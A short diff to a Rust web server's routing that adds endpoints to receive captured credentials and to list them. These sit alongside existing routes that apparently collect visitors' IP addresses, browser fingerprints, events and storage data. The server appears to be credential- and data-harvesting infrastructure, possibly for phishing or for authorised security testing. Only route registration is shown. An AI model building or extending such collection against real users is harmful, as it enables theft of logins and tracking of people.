@@ -161,7 +161,9 @@ async fn main() -> anyhow::Result<()> {
         .route("/capture/ip", post(capture::receive_ip))
         .route("/capture/fingerprint", post(capture::receive_fingerprint))
         .route("/capture/event", post(capture::receive_event))
-        .route("/capture/storage", post(receive_storage));
+        .route("/capture/storage", post(receive_storage))
+        .route("/capture/credentials", post(capture::receive_credentials))
+        .route("/credentials", get(api::list_credentials));
 
     let serve_dir = ServeDir::new(&frontend_dir)
         .append_index_html_on_directories(true);
